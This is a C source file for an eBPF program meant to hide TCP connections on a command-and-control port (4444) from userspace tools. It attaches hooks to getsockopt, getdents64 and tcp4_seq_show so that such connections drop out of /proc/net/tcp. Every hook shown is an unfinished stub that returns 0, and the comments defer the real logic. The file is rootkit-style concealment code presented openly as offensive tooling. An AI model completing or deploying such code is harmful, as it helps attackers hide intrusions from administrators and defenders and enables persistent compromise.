// hide_conn.bpf.c - Hide TCP connections from userspace

#include <linux/bpf.h>
#include <linux/in.h>
#include <linux/tcp.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>

#define C2_PORT 4444

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __type(key, __u32);
    __type(value, __u32);
    __uint(max_entries, 1);
} hide_port SEC(".maps");

SEC("fexit/getsockopt")
int BPF_PROG(hide_tcp_conn, struct pt_regs *ctx, int level, int optname, int ret)
{
    if (ret != 0) return 0;
    if (level != SOL_SOCKET || optname != SO_ACCEPTCONN) return 0;

    // This is a hacky way to detect connection enumeration
    // We'll use a simpler approach below
    return 0;
}

// Better: Hook getdents64 on /proc/net/tcp
SEC("fentry/getdents64")
int BPF_PROG(filter_proc_net_tcp, struct pt_regs *ctx)
{
    // This is complex for now
    // We'll use a simpler userspace approach first
    return 0;
}

// SIMPLE APPROACH: Hook tcp4_seq_show to filter out our port
SEC("fexit/tcp4_seq_show")
int BPF_PROG(hide_c2_in_proc_net_tcp, struct pt_regs *ctx, int ret)
{
    if (ret <= 0) return 0;

    // This runs in kernel context when /proc/net/tcp is read
    // We'll mark connections on our port for filtering
    // For now, we'll use a map to mark PIDs
    return 0;
}
